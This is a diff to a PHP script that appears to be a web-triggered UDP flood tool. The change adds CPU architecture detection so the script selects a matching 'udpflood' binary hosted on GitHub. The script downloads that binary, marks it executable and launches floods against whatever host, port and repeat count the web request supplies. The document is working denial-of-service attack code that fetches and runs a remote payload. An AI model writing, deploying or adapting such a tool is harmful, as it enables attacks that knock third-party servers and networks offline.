@@ -1,7 +1,20 @@
 <?php
 
 $fname = 'udpflood';
-$link = 'https://github.com/Cvar1984/ambatukam/raw/main/udpflood';
+$arch = php_uname('m');
+switch ($arch) {
+    case 'aarch64':
+        $link = 'https://github.com/Cvar1984/ambatukam/raw/main/udpflood_aarch64';
+        break;
+    case 'x86_64':
+        $link = 'https://github.com/Cvar1984/ambatukam/raw/main/udpflood_x86';
+        break;
+    case 'i686':
+        $link = 'https://github.com/Cvar1984/ambatukam/raw/main/udpflood_i686';
+        break;
+    default:
+        exit("Unknown architecture");
+}
 
 function cmd($in, $re = false)
 {
@@ -63,30 +76,30 @@ function escape_all($args)
 }
 try {
 
-if (!file_exists($fname)) {
-    $contents = @file_get_contents($link);
-    @file_put_contents($fname, $contents);
-    @chmod($fname, 0755); // executable
-}
+    if (!file_exists($fname)) {
+        $contents = @file_get_contents($link);
+        @file_put_contents($fname, $contents);
+        @chmod($fname, 0755); // executable
+    }
 
-if (!(isset($_REQUEST['host']) && isset($_REQUEST['port']))) {
-    show_source(basename($_SERVER['PHP_SELF'])); // just in case
-    exit;
-}
+    if (!(isset($_REQUEST['host']) && isset($_REQUEST['port']))) {
+        show_source(basename($_SERVER['PHP_SELF'])); // just in case
+        exit;
+    }
 
-$host = $_REQUEST['host'];
-$host = escape_all($host);
-$port = $_REQUEST['port'];
-$port = escape_all($port);
+    $host = $_REQUEST['host'];
+    $host = escape_all($host);
+    $port = $_REQUEST['port'];
+    $port = escape_all($port);
 
-if (isset($_REQUEST['times'])) {
-    $times = $_REQUEST['times'];
-} else {
-    $times = 10;
-}
+    if (isset($_REQUEST['times'])) {
+        $times = $_REQUEST['times'];
+    } else {
+        $times = 10;
+    }
 
-$times = escape_all($times);
-echo '<pre>', flood_udp($host, $port, $times);
-} catch(Exception $e) {
+    $times = escape_all($times);
+    echo '<pre>', flood_udp($host, $port, $times);
+} catch (Exception $e) {
     echo $e->getMessage();
 }
